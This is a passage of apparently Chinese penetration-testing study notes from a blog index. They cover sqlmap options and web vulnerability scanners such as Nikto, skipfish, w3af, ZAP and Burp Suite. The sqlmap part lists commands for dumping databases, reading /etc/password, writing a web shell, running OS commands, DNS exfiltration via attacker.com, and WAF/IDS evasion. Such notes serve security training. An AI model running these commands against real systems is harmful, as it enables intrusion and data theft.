MaxDB</li></ul></li><li>其他特性</li><li><ul><li>数据库直接连接-d</li><li><ul><li>不通过SQL注入，指定身份认证信息，IP，端口</li></ul></li><li>与Burpsuite google联合使用，支持正则表达式限定测试目标</li><li>GET POST cookie referer User-Agent （随机或指定）</li><li><ul><li>cookie过期后自动处理set-cookie头，更新cookie信息</li></ul></li><li>限速：最大并发、延迟发送</li><li>支持Basic Digest NTLM CA身份认证</li><li>数据库版本，用户，权限，hash枚举和字典破解，暴力破解表列名称</li><li>文件上传下载，UDF，启动并执行存储过程，操作系统命令执行，访问Windows注册表</li><li>与w3af,metasploit集成结合使用，基于数据库服务进程提权和上传执行后门</li></ul></li><li><code>sqlmap -h / -hh</code></li><li><code>sqlmap -d &quot;mysql://user:password@192.168.20.10:3306/dvwa&quot; -f --users --banner --dbs --schema -a</code></li><li><code>sqlmap --version -v</code></li><li>日志 .sqlmap</li><li>输出</li><li><ul><li>输出内容详细度分7个等级</li></ul></li><li>GET方法</li><li><ul><li><code>sqlmap -u &quot;http://192.168.20.10/mutillidae/index.php?page=user-info.php&amp;username=11&amp;password=22&amp;user-info-php-submit-button=View+Account+Details&quot; -p username -f</code></li></ul></li><li>扫描URL列表文件</li><li><ul><li><code>sqlmap -m list.txt</code></li></ul></li><li>扫描Google搜索结果</li><li><ul><li><code>sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;</code></li></ul></li><li>POST方法</li><li><ul><li>使用Http请求文件（burpsuite)</li><li><ul><li><code>sqlmap -r request.txt</code></li></ul></li><li>使用burpsuite log 文件</li><li><ul><li><code>sqlmap -l log.txt</code></li></ul></li></ul></li><li>HTTPS</li><li><ul><li><code>sqlmap -u “https://1.1.1.1/a.php?id=1:8843” --force-ssl</code></li></ul></li><li>扫描配置文件</li><li><ul><li><code>sqlmap -c sqlmap.conf</code></li></ul></li><li>数据段：–data</li><li><ul><li>get/post 都适用</li><li><code>sqlmap -u &quot;http://1.1.1.1/a.php&quot; --data=&quot;user=1&amp;pass=2&quot; -f</code></li></ul></li><li>变量分隔符：–param-del</li><li><ul><li><code>http://1.1.1.1/a.php?q=foo;id=1 // ; &amp;</code></li><li><code>sqlmap -u &quot;http://1.1.1.1/a.php&quot; --data=&quot;q=foo;id=1&quot; --param-del=&quot;;&quot; -f</code></li></ul></li><li>cookie头： –cookie</li><li><ul><li>web应用需要基于cookie的身份认证</li><li>检查cookie中的注入点（level &gt;=2)</li><li><code>Set-Cookie / --drop-set-cookie / --cookie-del</code></li><li><code>sqlmap -u &quot;http://1.1.1.1/a.php?id=1&quot; --cookie=&quot;a=1;b=2&quot; -f</code></li></ul></li><li>–user-agent</li><li><ul><li><code>sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org</code></li></ul></li><li>–random-agent</li><li><ul><li><code>/usr/share/sqlmap/txt/user-agents.txt</code></li></ul></li><li>sqlmap检查user-agent中的注入点：level&gt;=3</li><li>APP/WAF/IPS/IDS 过滤异常user-agent时报错</li><li>Host头： –host</li><li><ul><li>level=5</li></ul></li><li>referer头： –referer</li><li><ul><li>level&gt;=3</li></ul></li><li>额外的header：–headers</li><li><ul><li>每个头单独一行（名称区分大小写）</li></ul></li><li>–method= GET/POST</li></ul></li><li><p>基于HTTP协议的身份认证</p></li><li><ul><li>basic</li><li>digest</li><li>NTLM</li><li><code>sqlmap. -u &quot;http://1.1.1.1/a.php?id=1&quot; --auth-type Basic --auth-cred &quot;user:pass</code></li></ul></li><li><p>–auth-cert / –auth-file</p></li><li><ul><li>–auth-file = “ca.PEM”</li><li>含有私钥的PEM格式证书文件</li><li>PEM格式的证书链文件</li></ul></li><li><p>Http(s)代理</p></li><li><ul><li><code>--proxy=&quot;http://127.0.0.1:8087&quot;</code></li><li><code>--proxy-cred=&quot;name:pass&quot;</code></li><li><code>--ignore-proxy</code> 忽略系统级代理设置，通常用于扫描本地网络目标</li></ul></li><li><p>–delay</p></li><li><ul><li>每次https请求之间延迟时间，浮点数，单位为秒，默认无延迟</li></ul></li><li><p>–timeout</p></li><li><ul><li>请求超时时间，浮点数，默认为30秒</li></ul></li><li><p>–retries</p></li><li><ul><li>http(s)连接超时重试次数，默认3次</li></ul></li><li><p>–randomize</p></li><li><ul><li>长度，类型与原始值保持一致的前提下，指定每次请求随机取值的参数名</li></ul></li><li><p>–scope</p></li><li><ul><li>过滤日志内容，通过正则表达式筛选扫描对象</li><li><code>sqlmap -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)“</code></li><li><code>sqlmap -l 2.log --scope=&quot;(19)?\.168\.20\.(1|10|100)&quot; --level 3 --dbs</code></li></ul></li><li><p>–safe-url / –safe-freq</p></li><li><ul><li>检测和盲注阶段会产生大量失败请求，服务器端可能因此销毁session</li><li>每发送–safe-freq次注入请求后，发送一次正常请求</li></ul></li><li><p>–skip-urlencode</p></li><li><ul><li>默认Get方法会对传输内容进行编码，某些WEB服务器不遵守RFC标准编码，使用原始字符提交数据</li></ul></li><li><p>–eval</p></li><li><ul><li>每次请求前执行指定的python代码</li><li>每次请求更改或增加新的参数值（时间依赖，其他参数值依赖）</li><li><code>sqlmap -u &quot;http://1.1.1.1/a.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</code></li></ul></li><li><p>优化性能</p></li><li><p>–predict-output</p></li><li><ul><li>根据检测方法，比对返回值和统计表内容，不断缩小检测范围，提高检测效率</li><li>版本名，用户名，密码，privileges，role，数据库名称，表名，列名</li><li>与–threads参数不兼容</li><li>统计表：<code>/usr/share/sqlmap/txt/common-outputs.txt</code></li></ul></li><li><p>–keep-alive</p></li><li><ul><li>使用http 长连接，性能好</li><li>与–proxy参数不兼容</li><li>长连接避免重复建立连接的网络开销，但大量长连接会严重占用服务器资源</li></ul></li><li><p>–null-connection</p></li><li><ul><li>只获取相应页面的大小值，而非页面具体内容</li><li>通常用于盲注判断 真/假， 降低网络带宽消耗</li><li>与–text-only参数不兼容（基于页面内容的比较判断真/假）</li></ul></li><li><p>–threads</p></li><li><ul><li>最大并发线程</li><li>盲注时每个线程获取一个字符（7次请求），获取完成后线程结束</li><li>默认值为1，建议不要超过10，否则可能影响站点可用性</li><li>与 –predict-output参数不兼容</li></ul></li><li><p>-o 开启前三个性能参数（除–threads参数）</p></li><li><p>-p</p></li><li><ul><li>指定扫描的参数，使–level失效</li><li>-p “user-agent, referer”</li></ul></li><li><p>–skip</p></li><li><ul><li>排除指定的扫描参数</li><li><code>--level=5 --skip=&quot;id,user-agent&quot;</code></li></ul></li><li><p>uri注入点</p></li><li><ul><li><code>sqlmap -u “http://targeturl/param1/value1*/param2/value2*/&quot;</code></li></ul></li><li><p><code>--dbms=&quot;mysql&quot;</code></p></li><li><p><code>--os</code></p></li><li><p><code>--invalid-bignum / --invalid-logical</code></p></li><li><ul><li>通常sqlmap使用负值使参数取值失效</li><li>bignum使用大数使参数值失效</li><li>Logical使用布尔判断使取值失效</li></ul></li><li><p>–no-cast</p></li><li><ul><li>榨取数据时，sqlmap将所有结果转换为字符串，并用空格替换NULL结果</li><li>老版本mysql数据库需要开启此开关</li></ul></li><li><p>–no-escape</p></li><li><ul><li>出于混淆和避免出错的目的，payload中用单引号界定字符串时，sqlmap使用char()编码逃逸的方法替换字符串</li><li><code>SELECT &#39;foo&#39; ? SELECT CHAR(102)+CHAR(111)+CHAR(111)</code></li><li>本参数将关闭此功能</li></ul></li><li><p>–prefix / –suffix</p></li><li><ul><li><code>$query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;;</code></li><li><code>sqlmap -u &quot;http://1.1.1.1/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id--prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc“</code></li><li><code>query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND(’abc’=’abc’) LIMIT 0, 1&quot;;</code></li></ul></li><li><p>–tamper</p></li><li><ul><li>混淆脚本，用于绕过应用层过滤，IPS，WAF</li><li><code>sqlmap -u “http://1.1.1.1/a.php?id=1” --tamper=&quot;tamper/between.py,tamper/randomcase.py,tamper/space2comment.py&quot; -v 3</code></li></ul></li><li><p>–level</p></li><li><ul><li>1-5级</li><li>/usr/share/sqlmap/xml/payloads</li></ul></li><li><p>–risk</p></li><li><ul><li>risk升高可造成数据被篡改等风险</li></ul></li><li><p>–string –not-string –regexp –code –text-only –titles</p></li><li><ul><li>页面比较，基于布尔的注入检测，依据返回页面内容的变化判断真假逻辑，但有些页面随时间阈值变化，此时需要人为指定标识真假的字符串</li></ul></li><li><p>默认使用全部技术</p></li><li><ul><li>B: Boolean-based blind<br>E: Error-based<br>U: Union query-based<br>S: Stacked queries<br>T: Time-based blind</li></ul></li><li><p>–time-sec</p></li><li><ul><li>基于时间的注入检测相应延迟时间</li></ul></li><li><p>–union-cols</p></li><li><ul><li>默认联合查询1-10列，随–level增加最多支持50列</li><li>–union-cols 6-9</li></ul></li><li><p>–union-char</p></li><li><ul><li>联合查询默认使用NULL，极端情况下NULL可能失败，此时可以手动指定数值</li><li>–union-char 123</li></ul></li><li><p>–dns-domain</p></li><li><ul><li>攻击者控制了某DNS服务器，使用此功能可以提高数据榨取的速度</li><li>–dns-domain attacker.com</li></ul></li><li><p>–second-order</p></li><li><ul><li>在一个页面注入的结果，从另一个页面体现出来</li><li>–second-order <a href="http://1.1.1.1/b.php" target="_blank" rel="noopener">http://1.1.1.1/b.php</a></li></ul></li><li><p>-f, –fingerprint, -b , –banner</p></li><li><ul><li>数据库管理系统指纹信息</li><li>DBMS，操作系统，架构，补丁</li></ul></li><li><p>ENUMERATION</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">--current-user</span><br><span class="line">--current-db</span><br><span class="line">--hostname</span><br><span class="line">--users</span><br><span class="line">--privileges -U username </span><br><span class="line">--roles</span><br><span class="line">--dbs</span><br><span class="line">--tables, --exclude-sysdbs –D dvwa</span><br><span class="line">-T users -D dvwa -C user --columns</span><br><span class="line">--schema --batch --exclude-sysdbs 元数据（使用默认选项）</span><br><span class="line">--count</span><br><span class="line">Dump数据</span><br><span class="line">--dump, -C, -T, -D, --start, --stop</span><br><span class="line">--dump-all --exclude-sysdbs</span><br><span class="line">--sql-query &quot;select * from users&quot;</span><br></pre></td></tr></table></figure></li><li><p>BRUTE FORCE</p></li><li><ul><li>MySQL &lt; 5.0 没有information_schema 库</li><li>MySQL &gt;= 5.0  但无权读取information_schema库</li><li>微软的access数据库 ，默认无权读取MSysObjects库</li><li>–common-tables</li><li>–common-columns</li></ul></li><li><p>–udf-inject ,–shared-lib</p></li><li><ul><li><code>http://www.slideshare.net/inquis/advanced-sql-injection-to-operating-system-full-control-whitepaper-4633857</code></li></ul></li><li><p>–file-read = “/etc/password”</p></li><li><p>–file-write=”shell.php” –file-dest “/tmp/shell.php”</p></li><li><p>MySQL，postgresql</p></li><li><ul><li>上传共享库并生成sys_exec(),sys_eval()两个UDF</li></ul></li><li><p>mssql</p></li><li><ul><li>xp_cmdshell存储过程</li></ul></li><li><p>Windows registory</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--reg-read</span><br><span class="line">--reg-add</span><br><span class="line">--reg-del</span><br><span class="line">--reg-key?--reg-value?--reg-data?--reg-type</span><br><span class="line">sqlmap –u=&quot;http://1.1.1.1/a.aspx?id=1&quot; --reg-add --reg-</span><br><span class="line">key=&quot;HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap&quot; --reg-value=Test --</span><br><span class="line">reg-type=REG_SZ --reg-data=1</span><br></pre></td></tr></table></figure></li><li><p>-s : sqlite会话文件保存位置</p></li><li><p>-t: 记录流量文件保存位置</p></li><li><p>–charset:强制字符编码</p></li><li><p>–crawl：从起始位置爬站深度</p></li><li><p>–csv-del：dump数据默认存于“，”分割的csv文件中，指定其他分隔符</p></li><li><p>–dbms-cred：指定数据库账号</p></li><li><p>–flush-session：清空session</p></li><li><p>–force-ssl</p></li><li><p>–fresh-queries:忽略session查询结果</p></li><li><p>–hex:dump非ASCII字符内容时，将其编码为16进制形式，收到后解码还原</p></li><li><p>–output-dir=/tmp</p></li><li><p>–parse-errors:分析和显示数据库内建报错信息</p></li><li><p>–save:将命令保存成配置文件</p></li><li><p>MISCELLANEOUS</p></li><li><ul><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-z 参数注记符</span><br><span class="line">sqlmap --batch --random-agent --ignore-proxy --technique=BEU -u</span><br><span class="line">“1.1.1.1/a.php?id=1&quot;</span><br><span class="line">sqlmap -z &quot;bat,randoma,ign,tec=BEU&quot; -u “1.1.1.1/a.php?id=1&quot;</span><br><span class="line">sqlmap --ignore-proxy --flush-session --technique=U --dump -D testdb -T</span><br><span class="line">users -u “1.1.1.1/a.php?id=1&quot;</span><br><span class="line">sqlmap -z &quot;ign,flu,bat,tec=U,dump,D=testdb,T=users&quot; -u “1.1.1.1/</span><br><span class="line">vuln.php?id=1“</span><br></pre></td></tr></table></figure></li><li><p>–answer</p></li><li><p>–check-waf: 检测WAF/IPS/IDS</p></li><li><p>–hpp: HTTP parameter pollution</p></li><li><ul><li>绕过WAF/IPS/IDS的有效方法</li><li>尤其对ASP/IIS 和 ASP.NET/IIS</li></ul></li><li><p>–identify-waf：彻底的WAF/IPS/IDS检查</p></li><li><p>–mobile: 模拟智能手机设备</p></li><li><p>–purge-output：清除output文件夹</p></li><li><p>–smart：当有大量检测目标时，只选择基于错误的检测结果</p></li><li><p>–wizard</p></li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Web扫描工具</title>
      <link href="/2018/04/07/Web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/"/>
      <url>/2018/04/07/Web%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<h1 id="WEB渗透"><a href="#WEB渗透" class="headerlink" title="WEB渗透"></a>WEB渗透</h1><h5 id="Web技术发展"><a href="#Web技术发展" class="headerlink" title="Web技术发展"></a>Web技术发展</h5><ul><li>静态Web</li><li>动态Web<ul><li>应用程序</li><li>数据库</li><li>每人看到的内容不同</li><li>根据用户输入返回不同结果</li></ul></li><li>Web攻击类型有数百种</li></ul><h5 id="Web攻击面"><a href="#Web攻击面" class="headerlink" title="Web攻击面"></a>Web攻击面</h5><ul><li>Network</li><li>OS</li><li>Web Server</li><li>App Server</li><li>Web Application</li><li>Database</li><li>Browser</li></ul><h5 id="HTTP协议基础"><a href="#HTTP协议基础" class="headerlink" title="HTTP协议基础"></a>HTTP协议基础</h5><ul><li>明文<ul><li>无内建的机密性安全机制</li><li>嗅探或代理截断可查看全部明文信息</li><li>https只能提高传输层安全</li></ul></li><li>无状态<ul><li>每一次客户端和服务器端的通信都是独立的过程</li><li>Web应用需要跟踪客户端会话（多步通信）</li><li>不使用cookie的应用，客户端每次请求都要重新身份验证</li><li>Session用于在用户身份验证后跟踪用户行为轨迹</li><li><ul><li>提高用户体验，但增加了攻击向量</li></ul></li></ul></li><li>Cycle<ul><li>请求/响应</li></ul></li><li>重要的Header</li><li><ul><li>Set-Cookie: 服务器发给客户端的SessionID（被窃取的风险）</li><li>Content-Length: 响应body部分的字节长度</li><li>Location：重定向用户到另一个页面，可识别身份认证后允许访问的页面</li><li>Cookie：客户端发回给服务器证明用户状态的信息（头：值成对出现）</li><li>Referrer: 发起新请求之前用户位于哪个页面，服务器基于此头的安全限制很容易被修改绕过</li></ul></li><li>状态码</li><li><ul><li>服务端响应的状态码表示响应的结果类型（5大类50多个具体响应码）</li><li>100s:服务器响应的信息，通常表示服务器还有后续处理，很少出现</li><li>200s:请求被服务器成功接受并处理后返回的响应结果</li><li>300s: 重定向，通常在身份认证成功后重定向到一个安全页面（301/302）</li><li>400s: 表示客户端请求错误</li><li><ul><li>401：需要身份验证</li><li>403：拒绝访问</li><li>404：目标未发现</li></ul></li><li>500s: 服务器内部错误（503：服务不可用）</li><li><a href="http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html" target="_blank" rel="noopener">http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html</a></li></ul></li><li>实验环境</li><li><ul><li>Metasploitable<ul><li>DVWA</li></ul></li></ul></li><li>侦察</li><li><ul><li>Httrack</li><li><ul><li>减少与目标系统交互</li></ul></li></ul></li><li>扫描工具<h5 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h5><ul><li>Vega</li><li>Skipfish</li><li>W3af</li><li>Arachni</li><li>Owasp-zap</li><li>nikto</li></ul></li><li><ul><li>Perl语言开发的开源web安全扫描器</li><li>软件版本</li><li>搜索存在安全隐患的文件</li><li>服务器配置漏洞</li><li>web Application 层面的安全隐患</li><li>避免404误判</li><li><ul><li>很多服务器不遵守RFC标准，对于不存在的对象返回200响应码</li><li>依据响应文件内容判断，不同扩展名的文件404响应内容不同</li><li>去除时间信息后的内容取MD5值</li><li>-no404(参数)</li></ul></li><li><code>nikto -list-plugins</code></li><li><code>nikto -update</code>升级插件</li><li><code>nikto -host http://1.1.1.1</code></li><li><code>nikto -host 192.168.1.1 -ssl -port 443,8443,995</code></li><li><code>nikto -host host.txt</code></li><li><code>nmap -p80 192.168.1.0/24 -oG - | nikto -host -</code></li><li><code>nikto -host 192.168.1.1 -useproxy http://localhost:8087</code></li><li><code>-vhost</code></li></ul></li><li>Nikto-interactive</li><li><ul><li>Space - report current scan status</li><li>v - verbose mode on/off</li><li>d - debug mode on/off</li><li>e - error reporting on/off</li><li>p - progress reporting on/off</li><li>r - redirect display on/off</li><li>c - cookie display on/off</li><li>a - auth display on/off</li><li>q -quit </li><li>N - next host</li><li>P - Pause</li></ul></li><li>配置文件</li><li><ul><li><code>/etc/nikto.conf</code></li><li><code>STATIC-COOKIE=&quot;cookie1&quot;=&quot;cookie value&quot;;&quot;cookie2&quot;=&quot;cookie valu”</code></li></ul></li><li><code>evasion</code>: 使用LibWhisker中对IDS的躲避技术，可使用以下几种类型</li><li><ul><li>1 随机URL编码（非UTF-8方式）</li><li>2 自选择路径</li><li>3 过早结束的URL</li><li>4 优先考虑长随机字符串</li><li>5 参数欺骗</li><li>6 使用TAB作为命令的分隔符</li><li>7 使用变化的URL</li><li>8 使用Windows路径分隔符“\“</li></ul></li></ul><h5 id="Vega"><a href="#Vega" class="headerlink" title="Vega"></a>Vega</h5><ul><li>JAVA编写的开源Web扫描器</li><li>扫描模式</li><li>代理模式</li><li>爬站、处理表单、注入测试</li><li>支持SSL：<a href="http://vega/ca.crt" target="_blank" rel="noopener">http://vega/ca.crt</a></li></ul><h5 id="skipfish"><a href="#skipfish" class="headerlink" title="skipfish"></a>skipfish</h5><ul><li>C语言编写</li><li>实验性的主动web安全评估工具</li><li>递归爬网</li><li>基于字典的探测</li><li>速度较快</li><li><ul><li>多路单线程，全异步网络I/O，消除内存管理和调度开销</li><li>启发式自动内容识别</li></ul></li><li>误报较低</li><li><code>skipfish -o test http://1.1.1.1</code></li><li><code>skipfish -o test @url.txt</code></li><li><code>skipfish -o test -S complet.wl -W a.wl http://1.1.1.1</code>  #字典</li><li><code>-I</code> : 只检查包含string的URL</li><li><code>-X</code>: 不检查包含string 的URL</li><li><code>-K</code>: 不对指定参数进行Fuzz测试</li><li><code>-D</code>: 跨站点爬另外一个域</li><li><code>-l</code>: 每秒最大请求数</li><li><code>-m</code>: 每IP最大并发连接数</li><li><code>--config</code>: 指定配置文件</li><li>身份认证</li><li><code>skipfish -A user:pass -o test http://1.1.1.1</code></li><li><code>skipfish -C &quot;name=val&quot; -o test http://1.1.1.1</code></li><li><code>Username / Password</code></li><li><code>skipfish -o b --auth-form http://10.10.10.134/dvwa/login.php --auth-form-target http://10.10.10.134/dvwa/login.php --auth-user-field username  --auth-user admin --auth-pass-field password --auth-pass password --auth-verify-url http://10.10.10.134/dvwa/index.php -I dvwa -X logout http://10.10.10.134/dvwa</code></li><li>扫描结束太快</li><li><ul><li>触发了目标站点的连接数限制，降低 -m -l 数值</li></ul></li></ul><h5 id="w3af"><a href="#w3af" class="headerlink" title="w3af"></a>w3af</h5><ul><li><p>Web Application Attack and Audit Framework ,基于python 语言开发</p></li><li><p>此框架的目标是帮助你发现和利用所有Web应用程序漏洞</p></li><li><p>9大类近150个plugin</p></li><li><ul><li>audit</li><li>infrastructure</li><li>grep</li><li>evasion</li><li>mangle</li><li>auth</li><li>bruteforce</li><li>output</li><li>crawl</li></ul></li><li><p>安装</p></li><li><p>W3af_console</p></li><li><ul><li>help #显示可用指令</li><li>plugin    #进入plugin子命令</li><li><ul><li>help    显示可用指令</li><li>list audit    列出audit类所有差劲啊</li><li>audit sqli xss    选择使用的audit插件</li></ul></li><li>http-settings / misc-settings    全局配置</li><li><ul><li>help</li><li>view    查看可配置的参数</li><li>set       设置参数</li><li>back    回到上一级命令</li></ul></li></ul></li><li><p>profiles</p></li><li><ul><li>save_as self-contained</li><li>save_as test self-contained</li></ul></li><li><p>target</p></li><li><ul><li>set target <a href="http://1.1.1.1/" target="_blank" rel="noopener">http://1.1.1.1/</a></li></ul></li><li><p>start</p></li><li><p>script</p></li><li><ul><li>script/* .w3af</li></ul></li><li><p>w3af 身份认证</p></li><li><p>HTTP Basic</p></li><li><p>NTLM</p></li><li><p>Form</p></li><li><p>Cookie</p></li><li><p>截断代理</p></li><li><p>HTTP header file</p></li><li><p>W3af不支持客户端技术（Javascript, flash, java applet)</p></li><li><p>截断代理手动爬网</p></li><li><ul><li>spider_man</li><li>output.export_requests</li><li><a href="http://127.1.1.1/spider_man?terminate" target="_blank" rel="noopener">http://127.1.1.1/spider_man?terminate</a></li></ul></li><li><p>crawl.import_results</p></li><li><ul><li>base64</li></ul></li><li><p>exploit</p></li><li><p>Fuzzy requests</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Numbers from 0 to 4: $range(5)$</span><br><span class="line">First ten letters: $string.lowercase[:10]$</span><br><span class="line">The words spam and eggs: $[’spam’, ’eggs’]$</span><br><span class="line">The content of a file: $[l.strip() for l in file(’input.txt’)]$</span><br></pre></td></tr></table></figure></li><li><p>Cluster responses</p></li></ul><h5 id="Arachni"><a href="#Arachni" class="headerlink" title="Arachni"></a>Arachni</h5><ul><li>安装</li><li><code>http://www.arachni-scanner.com/download/#Linux</code></li><li><code>tar xvf arachni.tar.gz</code></li><li>Profile</li><li><ul><li>Import</li><li>Export</li><li>New</li></ul></li><li>Dispatcher</li><li><ul><li><code>./arachni_rpcd --address=127.0.0.1 --port=1111 --nickname=test1</code></li></ul></li><li>Grid</li><li><ul><li><code>./arachni_rpcd --nickname=test2 --address=127.0.0.1 --neighbour=127.0.0.1:1111</code></li></ul></li><li>Scan</li><li>?-s</li></ul><h4 id="OWASP-ZAP"><a href="#OWASP-ZAP" class="headerlink" title="OWASP_ZAP"></a>OWASP_ZAP</h4><ul><li>Zed attack proxy</li><li>Web application集成渗透测试和漏洞挖掘工具</li><li>开源免费跨平台简单易用</li><li>截断代理</li><li>主动、被动扫描</li><li>Fuzzy,暴力破解</li><li>API</li><li>• Persist Session<br>• Mode——Safe  Protected  Standard  ATTACK<br>• add-ons<br>• Scan policy<br>• Anti CSRF Tokens<br>• https——CA<br>• Scope / Contexts / filter<br>• Http Sessions——default session tokens &amp; site session tokens<br>• Note / tag<br>• Passive scan</li><li>标准扫描工作流程</li><li><ul><li>设置代理</li><li>手动爬网</li><li>自动爬网</li><li>主动扫描</li></ul></li></ul><h5 id="Burpsuite"><a href="#Burpsuite" class="headerlink" title="Burpsuite"></a>Burpsuite</h5><ul><li><p>Web安全工具中的瑞士军刀</p></li><li><p>统一的集成工具发现全部现代Web安全漏洞</p></li><li><p>PortSwigger公司开发</p></li><li><p>所有的工具共享一个能处理并显示HTTP消息的可扩展框架，模块之间无缝交换信息</p></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">• Proxy</span><br><span class="line">• Options</span><br><span class="line">• Invisible</span><br><span class="line">• CA</span><br><span class="line">• Intercept </span><br><span class="line">• Response modify</span><br><span class="line">• Target</span><br><span class="line">• Scope logout</span><br><span class="line">• Filter</span><br><span class="line">• Comparing site map</span><br><span class="line">• Active / Passive Scan</span><br><span class="line">• Extender</span><br><span class="line">• BApp Store</span><br><span class="line">• Jython</span><br><span class="line">• http://www.jython.org/downloads.html</span><br><span class="line">• Option</span><br><span class="line">• Scan queue</span><br><span class="line">• Result</span><br><span class="line">• POSITION</span><br><span class="line">• PAYLOAD</span><br><span class="line">• Simple list</span><br><span class="line">• Runtime file</span><br><span class="line">• Character substitution</span><br><span class="line">• Case modification</span><br><span class="line">• Character blocks</span><br><span class="line">• Numbers?Copy other payload</span><br><span class="line">• Dates?Brute forcer?Character frobber?Username generator</span><br><span class="line">• OPTIONS</span><br><span class="line">• Grep match</span><br><span class="line">• Repeater</span><br><span class="line">• Request History</span><br><span class="line">• Change request method</span><br><span class="line">• Change body encoding</span><br><span class="line">• Copy as curl command</span><br><span class="line">• Convert selection</span><br><span class="line">• Repeater </span><br><span class="line">• Engagement tools——generate csrf PoC</span><br><span class="line">• Follow redirections</span><br><span class="line">• Process cookies in redirections</span><br><span class="line">Sequencer</span><br><span class="line">分析程序中可预测的数据</span><br><span class="line">• Session cookies</span><br><span class="line">• anti-CSRF tokens</span><br><span class="line">• Start live capture</span><br><span class="line">• Analyze</span><br><span class="line">• Character-level</span><br><span class="line">• Bit-level</span><br><span class="line">• FIPS(Federal Information Processing Standard)</span><br><span class="line">Decoder</span><br><span class="line">smart decode</span><br></pre></td></tr></table></figure></li></ul><h5 id="代理截断工具"><a href="#代理截断工具" class="headerlink" title="代理截断工具"></a>代理截断工具</h5><ul><li>Paros</li><li>Webscrab</li><li>Burpsuite</li></ul><h5 id="ACUNETIX-WEB-VULNERABILITY-SCANNER"><a href="#ACUNETIX-WEB-VULNERABILITY-SCANNER" class="headerlink" title="ACUNETIX WEB VULNERABILITY SCANNER"></a>ACUNETIX WEB VULNERABILITY SCANNER</h5><ul><li>自动手动爬网，支持AJAX，JAVASCRIPT</li><li>AcuSencsor 灰盒测试</li><li><ul><li>发现爬网无法发现文件</li><li>额外的漏洞扫描</li><li>可发现存在漏洞的源码行号</li><li>支持PHP，.NET</li></ul></li><li>生成PCI、27001标准合规报告</li><li>网络扫描</li><li><ul><li>FTP， DNS，SMTP，IMAP，POP3， SSH，SNMP，Telnet</li><li>集成openvas扫描漏洞</li></ul></li><li>爬站</li><li>子域扫描器</li><li>发现扫描器</li><li>SQL注入验证</li><li>Http editor </li><li>http sniffer</li><li>http fuzzer</li><li>身份认证测试</li><li>结果比较</li></ul><h5 id="APPSCAN"><a href="#APPSCAN" class="headerlink" title="APPSCAN"></a>APPSCAN</h5><ul><li>Watchfire APPScan , 2007年被IBM收购，称为IBMAPPSCAN</li><li>扫描过程</li><li><ul><li>探索阶段 </li><li>测试阶段</li></ul></li><li>第一个过程发现新的URL地址，下一个扫描过程自动开始</li><li>Glass box </li><li><ul><li>相当于Acusensor</li><li>Agent收集服务器端源代码信息和其他数据</li><li>支持Java，.NET两种平台</li></ul></li></ul>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>无线渗透</title>
      <link href="/2018/04/01/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/"/>
      <url>/2018/04/01/%E6%97%A0%E7%BA%BF%E6%B8%97%E9%80%8F/</url>
      
